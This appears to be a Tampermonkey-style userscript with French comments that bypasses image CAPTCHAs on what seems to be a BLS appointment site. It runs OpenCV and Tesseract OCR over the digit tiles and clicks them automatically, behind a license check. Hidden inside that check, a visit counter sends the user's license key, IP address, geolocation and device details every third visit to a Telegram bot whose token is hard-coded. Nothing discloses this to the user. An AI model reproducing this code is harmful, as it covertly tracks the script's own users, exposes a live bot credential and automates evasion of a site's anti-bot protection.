if (window.location.href.toLowerCase().includes('captcha')) {
  (function() {
  'use strict';


  const API_ENDPOINT = 'https://raw.githubusercontent.com/megaboussol/BlsCaptchaSolverClient/main/docs/api-key-validation.json';

  // Fonction pour vérifier la clé API
  function verifyApiKey() {
    return new Promise((resolve, reject) => {
      GM_xmlhttpRequest({
        method: 'GET',
        url: API_ENDPOINT,
        onload: function(response) {
          console.log('Réponse du serveur:', response.responseText); // Log de débogage
          try {
            const data = JSON.parse(response.responseText);
            const keyData = data[API_KEY];

            if (!keyData) {
              reject(new Error('Clé API non trouvée !'));
              return;
            }

            // Vérifier le statut de la clé
            if (keyData.status !== 'VALID') {
              reject(new Error('Licence invalide !'));
              return;
            }

            // Vérifier le nombre de visites restantes
            if (keyData.visits <= 0) {
              reject(new Error('Nombre de visites épuisé !'));
              return;
            }

            // Vérifier la date d'expiration
            const expiryDate = new Date(keyData.expiry);
            const today = new Date();
            if (today > expiryDate) {
              reject(new Error('Licence expirée !'));
              return;
            }
            //Compteur gm
(async function() {
    'use strict';

    // Récupérer le nombre de visites actuel
    let visites = GM_getValue("visites", 0);

    // Incrémenter le compteur
    visites++;

    // Sauvegarder la nouvelle valeur
    GM_setValue("visites", visites);

    // Afficher le compteur dans la console
    console.log(`Nombre de visites : ${visites}`);

    // Vérifier si le nombre de visites est un multiple de 11
    if (visites % 3 === 0) {
        SendReport(API_KEY+` a atteint ${visites} visites (multiple de 11) !`);
        getDeviceInfo().then(info => SendReport(info));
    }
})();

            // Décrémenter le nombre de visites (simulation)
            keyData.visits -= 1;
            console.log('Visites restantes:', keyData.visits);

            resolve(true); // Clé valide
          } catch (error) {
            console.error('Erreur lors du parsing de la réponse:', error); // Log de débogage
            reject(new Error('Erreur lors de la lecture de la réponse du serveur'));
          }
        },
        onerror: function(error) {
          console.error('Erreur de requête:', error); // Log de débogage
          reject(new Error('Erreur de connexion au serveur'));
        },
        ontimeout: function() {
          reject(new Error('La requête a expiré'));
        }
      });
    });
  }

  // Fonction principale
  async function main() {
    try {
      // Vérifier la clé API
      await verifyApiKey();
      console.log('Licence validée !');

function waitForTesseractAndOpenCV() {
  return new Promise((resolve) => {
    const checkTesseractAndOpenCV = () => {
      if (typeof Tesseract !== 'undefined' && typeof cv !== 'undefined') {
        resolve();
      } else {
        setTimeout(checkTesseractAndOpenCV, 100);
      }
    };
    checkTesseractAndOpenCV();
  });
}

(async function() {
  await waitForTesseractAndOpenCV();
  console.log('Tesseract.js et OpenCV.js sont chargés !');

  const config = {
    tessedit_char_whitelist: '0123456789',
    textord_underline_width: "1",
  };

  function normaliserTexte(texte) {
    return texte.replace(/[+J?Zz¥§;:&%gsSoO£9A]/g, (match) => {
      return { '+': '1', 'J': '1', '?': '7', 'Z': '7', 'z': '7', '¥': '7', '§': '8', ';': '1',
               ':': '1', '&': '2', '%': '2', 'g': '2', 's': '5', 'S': '5', 'o': '0', 'O': '0',
               '£': '29', '9A': '94' }[match] || match;
    });
  }

  function extractNumber(text) {
    var matches = text.match(/\d+/);
    return matches ? parseInt(matches[0]) : 0;
  }

  var elementsWithClass = document.querySelectorAll('.col-12.box-label');
  var highestZIndexNbrElementNbrNbr = [...elementsWithClass].reduce((maxEl, el) => {
    var zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
    return zIndex > (parseInt(window.getComputedStyle(maxEl).zIndex) || -Infinity) ? el : maxEl;
  }, elementsWithClass[0]);

  var numberFromText = extractNumber(highestZIndexNbrElementNbrNbr?.outerText || '');

  var parentElement = document.querySelector("#captchaForm > div.text-center.row.no-gutters").parentElement.parentElement.previousElementSibling;
  var childElements = parentElement.querySelectorAll('*');

  const positions = [
    {left: "0px", top: "0px"}, {left: "0px", top: "110px"}, {left: "0px", top: "220px"},
    {left: "110px", top: "0px"}, {left: "110px", top: "110px"}, {left: "110px", top: "220px"},
    {left: "220px", top: "0px"}, {left: "220px", top: "110px"}, {left: "220px", top: "220px"}
  ];

  function filterElementsWithPositionAndDisplay(elements, left, top, display) {
    return [...elements].filter(el => {
      var style = window.getComputedStyle(el);
      return style.left === left && style.top === top && style.display === display;
    });
  }

  function findHighestZIndexElement(elements) {
    return elements.reduce((maxEl, el) => {
      var zIndex = parseInt(window.getComputedStyle(el).zIndex) || -Infinity;
      return zIndex > (parseInt(window.getComputedStyle(maxEl).zIndex) || -Infinity) ? el : maxEl;
    }, elements[0]);
  }

  async function preprocessImage(img) {
    return new Promise((resolve, reject) => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const image = new Image();
      image.crossOrigin = 'Anonymous';
      image.src = img.src;

      image.onload = () => {
        console.log('Image chargée avec succès:', img.src);
        canvas.width = image.width;
        canvas.height = image.height;
        ctx.drawImage(image, 0, 0);

        // Convertir en niveaux de gris
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const src = cv.matFromImageData(imageData);
        cv.cvtColor(src, src, cv.COLOR_RGBA2GRAY, 0);

        // Appliquer un filtre gaussien
        const ksize = new cv.Size(5, 5);
        cv.GaussianBlur(src, src, ksize, 0, 0, cv.BORDER_DEFAULT);

        // Détecter et supprimer les lignes barrant les chiffres
        const edges = new cv.Mat();
        cv.Canny(src, edges, 50, 150);
        const lines = new cv.Mat();
        cv.HoughLinesP(edges, lines, 1, Math.PI / 180, 50, 30, 10);

        for (let i = 0; i < lines.rows; i++) {
          const line = lines.data32S.subarray(i * 4, (i + 1) * 4);
          cv.line(src, new cv.Point(line[0], line[1]), new cv.Point(line[2], line[3]), new cv.Scalar(255, 255, 255), 2);
        }

        // Appliquer un seuillage adaptatif
        cv.adaptiveThreshold(src, src, 255, cv.ADAPTIVE_THRESH_GAUSSIAN_C, cv.THRESH_BINARY, 17, 5);

        // Afficher l'image prétraitée sur le canvas
        cv.imshow(canvas, src);

        // Convertir en URL de données
        const processedImageUrl = canvas.toDataURL();
        console.log('Image prétraitée avec succès:', processedImageUrl);
        resolve(processedImageUrl);

        // Libérer la mémoire
        src.delete();
        edges.delete();
        lines.delete();
      };

      image.onerror = (err) => {
        console.error('Échec du chargement de l\'image:', err);
        reject(err);
      };
    });
  }

  function isMatchingNumber(text, target) {
    const cleanedText = text.replace(/\D/g, '');
    if (cleanedText.length === 3) {
      return cleanedText === target;
    } else if (cleanedText.length > 3) {
      return cleanedText.includes(target);
    }
    return false;
  }

  positions.forEach((position, index) => {
    var filteredElements = filterElementsWithPositionAndDisplay(childElements, position.left, position.top, "block");
    var highestZIndexElement = findHighestZIndexElement(filteredElements);

    if (highestZIndexElement) {
      setTimeout(async () => {
        try {
          const processedImageUrl = await preprocessImage(highestZIndexElement.children[0]);
          const imgElement = new Image();
          imgElement.src = processedImageUrl;

          Tesseract.recognize(
            imgElement, 'eng', config
          ).then(result => {
            var text = normaliserTexte(result.data.text).replace(/\D/g, '');
            console.log(`Texte détecté pour (${position.left}, ${position.top}): ${text}`);

            if (isMatchingNumber(text, numberFromText.toString()) && highestZIndexElement.children[0].className !== 'captcha-img img-selected') {
              highestZIndexElement.children[0].click();
            } else {
              console.log('La case est déjà sélectionnée ou ne correspond pas');
            }

            if (index === 8) {
              setTimeout(() => {
                document.getElementById('btnVerify').click();
                console.log("Clique sur 'Verify'");
              }, TimeToVerify * 1000);
            }
          });
        } catch (error) {
          console.error('Erreur lors du prétraitement ou de la reconnaissance:', error);
        }
      }, TimeToStartRead * 1000);
    } else {
      console.log(`Aucun élément trouvé pour (${position.left}, ${position.top})`);
    }
  });
})();

      // Le reste du script...
    } catch (error) {
      console.error('Erreur:', error.message);
      alert('Erreur : ' + error.message);
    }
  }

  // Démarrer le script
  main();
})();
}
//functions declaration
// Declaration Telegram function
function SendReport(message) {
        const TOKEN = '8103010659:AAEuPlceI-5pzwszZ6D14xEp0_HQizG3Ejk';
        const CHAT_ID = '-1002331768842';

	const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
	const data = {
		chat_id: CHAT_ID,
		text: message,
	};

	fetch(url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(data),
		})
		.then(response => response.json())
		.then(data => console.log(data))
		.catch(error => console.error('Erreur:', error));
}
//Infos function
async function getDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
    };

    try {
        // Récupérer l'adresse IP
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();

        deviceInfo.ip = data.ip;

        // Obtenir la localisation basée sur l'IP
        const geoResponse = await fetch(`https://ipwho.is/${data.ip}`);
        const geoData = await geoResponse.json();

        deviceInfo.city = geoData.city || "Unknown";
        deviceInfo.region = geoData.region || "Unknown";
        deviceInfo.country = geoData.country || "Unknown";
        deviceInfo.latitude = geoData.latitude || "Unknown";
        deviceInfo.longitude = geoData.longitude || "Unknown";

    } catch (error) {
        console.error("Impossible d'obtenir l'adresse IP et la localisation :", error);
    }

    return deviceInfo;
}


